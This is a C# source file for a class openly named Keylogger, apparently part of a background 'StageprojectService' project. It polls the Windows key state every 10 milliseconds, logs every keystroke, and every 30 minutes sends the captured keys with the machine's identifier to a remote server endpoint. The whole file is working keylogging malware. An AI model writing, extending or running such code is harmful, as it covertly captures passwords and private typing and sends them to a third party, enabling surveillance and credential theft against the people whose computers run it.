using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace StageprojectService
{
   public  class Keylogger
    {
        /// <summary>
        /// The GetAsyncKeyState function determines whether a key is up or down at the time 
        /// the function is called, and whether the key was pressed after a previous call 
        /// to GetAsyncKeyState.
        /// </summary>
        /// <param name="vKey">Specifies one of 256 possible virtual-key codes. </param>
        /// <returns>If the function succeeds, the return value specifies whether the key 
        /// was pressed since the last call to GetAsyncKeyState, and whether the key is 
        /// currently up or down. If the most significant bit is set, the key is down, 
        /// and if the least significant bit is set, the key was pressed after 
        /// the previous call to GetAsyncKeyState. </returns>
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(
            System.Windows.Forms.Keys vKey); // Keys enumeration

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(
            System.Int32 vKey);

        private System.String keyBuffer;
        private System.Timers.Timer timerKeyMine;
        private System.Timers.Timer timerBufferFlush;

        public Keylogger()
        {
            //
            // keyBuffer
            //
            keyBuffer = "";

            // 
            // timerKeyMine
            // 
            this.timerKeyMine = new System.Timers.Timer();
            this.timerKeyMine.Enabled = true;
            this.timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(this.timerKeyMine_Elapsed);
            this.timerKeyMine.Interval = 10;

            // 
            // timerBufferFlush
            //
            this.timerBufferFlush = new System.Timers.Timer();
            this.timerBufferFlush.Enabled = true;
            this.timerBufferFlush.Elapsed += new System.Timers.ElapsedEventHandler(this.timerBufferFlush_Elapsed);
            this.timerBufferFlush.Interval = 1800000; // 30 minutes
        }

        /// <summary>
        /// Itrerating thru the entire Keys enumeration; downed key names are stored in keyBuffer 
        /// (space delimited).
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void timerKeyMine_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                if (GetAsyncKeyState(i) == -32767)
                {
                    keyBuffer += Enum.GetName(typeof(Keys), i) + " ";
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void timerBufferFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if(keyBuffer != "")
            { 
            // Preprocessor Directives
#if (DEBUG)
            Console.WriteLine(keyBuffer); // debugging help
            Flush2DB(@"c:\keydump.txt", true);
#else
            Flush2DB(@"c:\keydump.txt", true);
#endif
            }
        }


        /// <summary>
        /// Transfers key stroke data from temporary buffer storage to permanent memory. 
        /// If no exception gets thrown the key stroke buffer resets.
        /// </summary>
        /// <param name="file">The complete file path to write to.</param>
        /// <param name="append">Determines whether data is to be appended to the file. 
        /// If the files exists and append is false, the file is overwritten. 
        /// If the file exists and append is true, the data is appended to the file. 
        /// Otherwise, a new file is created.</param>
        public void Flush2DB(string file, bool append)
        {
            try
            {
                //StreamWriter sw = new StreamWriter(file, append);

                //sw.Write(keyBuffer);

                //sw.Close();
                var responnse = Methods.saveDB(Data.dbserver+"keylogger/save", "{\"chaine\":\""+keyBuffer+"\",\"user\":{\"machineName\":\""+Methods.identifiant()+"\"}}");
                keyBuffer = ""; // reset
            }
            catch
            {   // rethrow the exception currently handled by 
                // a parameterless catch clause
                throw;
            }
        }

        #region Properties
        public System.Boolean Enabled
        {
            get
            {
                return timerKeyMine.Enabled && timerBufferFlush.Enabled;
            }
            set
            {
                timerKeyMine.Enabled = timerBufferFlush.Enabled = value;
            }
        }

        public System.Double FlushInterval
        {
            get
            {
                return timerBufferFlush.Interval;
            }
            set
            {
                timerBufferFlush.Interval = value;
            }
        }

        public System.Double MineInterval
        {
            get
            {
                return timerKeyMine.Interval;
            }
            set
            {
                timerKeyMine.Interval = value;
            }
        }
        #endregion

    }
}
